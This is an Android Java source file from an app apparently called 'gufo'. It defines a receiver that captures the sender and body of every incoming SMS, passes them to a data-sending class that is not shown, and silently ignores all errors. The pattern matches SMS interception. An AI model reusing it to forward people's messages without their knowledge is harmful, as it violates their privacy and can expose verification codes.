package com.lacerbo.gufo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

/**
 * Created by Vidal on 03/10/2015.
 ***********************************************/
public class SmsEntrada extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            assert bundle != null;
            Object messages[] = (Object[]) bundle.get("pdus");
            SmsMessage smsMessage[] = new SmsMessage[messages != null ? messages.length : 0];
            String celular = "", Mensagem = "";
            for (int n = 0; n < (messages != null ? messages.length : 0); n++) {
                smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
                celular += smsMessage[n].getDisplayOriginatingAddress();
                Mensagem += smsMessage[n].getDisplayMessageBody();
            }
            EnviarDados mEnviaDados = new EnviarDados();
            mEnviaDados.getInstance(context, "E", celular, Mensagem);
        } catch (Exception e) {
            // Não faça NADA.
        }
    }

}
